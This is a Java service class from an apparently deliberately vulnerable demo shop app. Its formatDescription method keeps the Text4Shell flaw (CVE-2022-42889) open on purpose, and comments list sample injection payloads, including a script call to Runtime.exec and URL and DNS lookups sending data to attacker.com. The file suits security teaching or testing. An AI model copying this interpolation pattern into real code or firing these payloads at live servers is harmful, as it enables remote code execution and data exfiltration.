package com.example.vulnerableapp.service;

import com.example.vulnerableapp.dto.ProductRequest;
import org.apache.commons.text.StringSubstitutor;
import org.springframework.stereotype.Service;

import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicLong;
import java.util.stream.Collectors;

/**
 * Service de gestion des produits.
 *
 * ATTENTION : ce service utilise Commons Text StringSubstitutor
 * qui est vulnerable a Text4Shell (CVE-2022-42889).
 * Un attaquant peut injecter ${script:javascript:...} dans le template
 * pour executer du code arbitraire sur le serveur.
 */
@Service
public class ProductService {

    private final Map<Long, Map<String, Object>> products = new ConcurrentHashMap<>();
    private final AtomicLong idCounter = new AtomicLong(1);

    public ProductService() {
        // Donnees de demo
        createProduct(buildRequest("Laptop Pro", "Ordinateur portable haute performance", 1299.99, "Informatique"));
        createProduct(buildRequest("Casque Audio", "Casque sans fil avec reduction de bruit", 249.99, "Audio"));
        createProduct(buildRequest("Clavier Mecanique", "Clavier gaming RGB switches Cherry MX", 149.99, "Informatique"));
    }

    public List<Map<String, Object>> getAllProducts() {
        return new ArrayList<>(products.values());
    }

    public Map<String, Object> getProduct(Long id) {
        Map<String, Object> product = products.get(id);
        if (product == null) {
            throw new NoSuchElementException("Produit non trouve : " + id);
        }
        return product;
    }

    public Map<String, Object> createProduct(ProductRequest request) {
        long id = idCounter.getAndIncrement();
        Map<String, Object> product = new LinkedHashMap<>();
        product.put("id", id);
        product.put("name", request.getName());
        product.put("description", request.getDescription());
        product.put("price", request.getPrice());
        product.put("category", request.getCategory());
        product.put("createdAt", new Date());
        products.put(id, product);
        return product;
    }

    public List<Map<String, Object>> searchProducts(String query) {
        String lowerQuery = query.toLowerCase();
        return products.values().stream()
                .filter(p -> {
                    String name = ((String) p.get("name")).toLowerCase();
                    String desc = p.get("description") != null
                            ? ((String) p.get("description")).toLowerCase() : "";
                    return name.contains(lowerQuery) || desc.contains(lowerQuery);
                })
                .collect(Collectors.toList());
    }

    /**
     * VULNERABLE : utilise StringSubstitutor avec les interpolateurs par defaut.
     * Un attaquant peut injecter :
     *   ${script:javascript:java.lang.Runtime.getRuntime().exec('whoami')}
     *   ${dns:attacker.com}
     *   ${url:UTF-8:https://attacker.com/steal?data=...}
     *
     * C'est la CVE-2022-42889 "Text4Shell".
     */
    public String formatDescription(String template) {
        // DANGEREUX : StringSubstitutor.createInterpolator() active TOUS les interpolateurs
        // y compris script, dns, url qui permettent l'execution de code
        StringSubstitutor substitutor = StringSubstitutor.createInterpolator();
        return substitutor.replace(template);
    }

    private ProductRequest buildRequest(String name, String desc, double price, String category) {
        ProductRequest req = new ProductRequest();
        req.setName(name);
        req.setDescription(desc);
        req.setPrice(price);
        req.setCategory(category);
        return req;
    }
}
